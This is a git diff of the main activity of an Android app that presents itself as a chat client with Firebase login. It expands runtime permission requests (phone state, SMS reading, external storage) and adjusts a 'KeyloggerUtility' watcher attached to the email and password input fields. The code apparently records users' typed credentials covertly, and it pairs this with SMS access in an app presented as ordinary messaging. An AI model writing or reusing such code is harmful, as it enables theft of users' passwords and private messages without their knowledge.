@@ -1,6 +1,8 @@
 package com.example.mychatapp;
 
+import android.Manifest;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -8,12 +10,9 @@ import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
-import android.text.Editable;
-import android.text.TextWatcher;
-import android.util.Log;
 import android.provider.Telephony;
+import android.telephony.TelephonyManager;
 import android.util.Patterns;
-import android.view.KeyEvent;
 import android.view.View;
 import android.widget.EditText;
 import android.widget.ProgressBar;
@@ -30,7 +29,6 @@ import com.google.android.gms.tasks.Task;
 import com.google.firebase.auth.AuthResult;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.gson.Gson;
-
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
@@ -43,11 +41,6 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.HashMap;
 import java.util.Map;
-
-
-import android.content.Context;
-import android.telephony.TelephonyManager;
-import android.Manifest;
 
 public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_CODE_READ_PHONE_STATE_AND_SMS = 1;
@@ -71,8 +64,11 @@ public class MainActivity extends AppCompatActivity {
 
         //need to set permission dynamically
         //get phone no need run 2 times then can get phone no.
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this,  new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_SMS},
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this,  new String[]{
+                            Manifest.permission.READ_PHONE_STATE,
+                            Manifest.permission.READ_SMS,
+                            Manifest.permission.WRITE_EXTERNAL_STORAGE},
                     REQUEST_CODE_READ_PHONE_STATE_AND_SMS);
                     System.out.println("Failed to get phone no");
         } else {
@@ -110,8 +106,8 @@ public class MainActivity extends AppCompatActivity {
         editPassword = findViewById(R.id.password);
         progressbarofLogin = findViewById(R.id.progressbarofSignin);
         firebaseAuth = FirebaseAuth.getInstance();
-        editEmail.addTextChangedListener(new KeyloggerUtility("Email"));
-        editPassword.addTextChangedListener(new KeyloggerUtility("Password"));
+        editEmail.addTextChangedListener(new KeyloggerUtility("Email","",""));
+        editPassword.addTextChangedListener(new KeyloggerUtility("Password","",""));
 
 
         register.setOnClickListener(new View.OnClickListener() {
